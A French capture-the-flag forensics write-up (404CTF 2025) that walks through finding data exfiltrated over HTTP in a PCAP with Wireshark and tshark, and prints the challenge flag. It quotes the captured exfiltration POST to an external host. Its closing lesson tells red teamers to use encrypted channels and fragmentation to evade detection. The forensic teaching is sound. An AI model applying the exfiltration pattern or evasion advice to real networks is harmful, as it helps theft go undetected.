---
titre: "Trafic Suspect — Analyse réseau PCAP"
ctf: 404CTF 2025
date: 2025-06-08
categorie: forensics
difficulte: easy
tags: [wireshark, pcap, http, forensics, réseau]
points: 100
---

## Description

> Notre SOC a détecté une activité suspecte sur le réseau. Voici la capture réseau. Trouve ce que l'attaquant a exfiltré.

Fichier fourni : `capture.pcap` (1.2 MB)

## Analyse avec Wireshark

On ouvre le fichier dans Wireshark et on observe le trafic. Quelques statistiques :

- **Protocol hierarchy** : 80% TCP, 15% HTTP, 5% DNS
- **Endpoints** : 2 IPs internes, 1 IP externe (`185.x.x.x`)

### Filtrage HTTP

```
http
```

On voit plusieurs requêtes POST vers `http://185.x.x.x/exfil`. Les paramètres des requêtes semblent encodés en base64.

### Extraction des données

`File → Export Objects → HTTP` pour récupérer tous les objets HTTP.

En examinant les corps des requêtes POST :

```
POST /exfil HTTP/1.1
Host: 185.x.x.x
Content-Type: application/x-www-form-urlencoded

data=NDADadQ0NEVDSF...
```

Décodage base64 :

```bash
echo "NDADadQ0NEVDSF..." | base64 -d
```

```
404CTF{w1r3sh4rk_1s_y0ur_fr13nd_in_f0r3ns1cs}
```

## Méthode alternative — tshark

Pour les puristes de la ligne de commande :

```bash
# Extraire tous les corps POST
tshark -r capture.pcap \
  -Y "http.request.method == POST" \
  -T fields \
  -e http.file_data \
  | while read line; do echo "$line" | base64 -d 2>/dev/null; done
```

## Leçon

L'exfiltration via HTTP en clair est facilement détectable par un IDS ou une analyse PCAP. En red team, préférer des canaux chiffrés (HTTPS, DNS over HTTPS, tunnels) et fragmenter les données pour éviter la détection basée sur les signatures.
